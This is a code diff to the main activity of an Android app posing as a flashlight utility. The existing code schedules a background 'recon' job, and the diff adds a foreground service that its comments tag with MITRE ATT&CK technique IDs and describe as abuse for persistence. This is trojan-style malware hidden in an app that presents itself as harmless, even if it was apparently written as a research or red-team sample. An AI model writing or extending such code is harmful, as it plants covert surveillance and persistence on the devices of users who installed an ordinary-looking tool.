@@ -1,11 +1,14 @@
 package com.utiltools.flashlight
 
+import android.content.Intent
 import android.hardware.camera2.CameraAccessException
 import android.hardware.camera2.CameraManager
 import android.os.Bundle
 import android.util.Log
 import android.widget.Button
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import com.utiltools.flashlight.persistence.ForegroundPersistenceService
 import com.utiltools.flashlight.recon.NetworkReconCollector
 import com.utiltools.flashlight.schedule.ReconJobWorker
 
@@ -37,6 +40,10 @@ class MainActivity : AppCompatActivity() {
 
         // Install phase (T1603): register the periodic background job.
         ReconJobWorker.schedule(applicationContext)
+
+        // Bonus persistence (T1541): abuse a foreground service to resist backgrounding.
+        val serviceIntent = Intent(this, ForegroundPersistenceService::class.java)
+        ContextCompat.startForegroundService(this, serviceIntent)
     }
 
     private fun toggleTorch() {
